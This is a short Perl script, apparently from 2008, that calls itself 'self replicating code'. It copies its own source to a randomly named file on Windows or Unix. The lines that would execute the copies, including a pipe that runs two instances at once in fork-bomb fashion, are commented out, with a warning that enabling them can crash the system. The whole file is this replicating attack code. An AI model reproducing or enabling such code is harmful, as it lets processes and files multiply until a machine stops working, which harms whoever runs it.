#!/usr/bin/perl
#CROSS-PLATFORM SON!!!
#self replicating code

#shyft 2008

if (`ver` =~ /Windows/ )
{
	#WINDOWS
	
	$str = `type $0`;
	$fname = rand(100000000) . ".pl";
	open(FILE,">$fname");
	print FILE $str;
	close FILE;
	#uncommenting can cause system to crash
	#$cmd = "perl ".$fname;
	#system($cmd);
		
}else
{	
	#*NIX
	
	$str = `cat $0`;
	$fname = rand(100000000) . ".pl";
	open(FILE,">$fname");
	print FILE $str;
	close FILE;
	#uncommenting can cause system to crash
	#$chmod = "chmod +x $fname";
	#system($chmod);

	#$cmd = "./$fname|./$fname";
	#system($cmd);
		
}
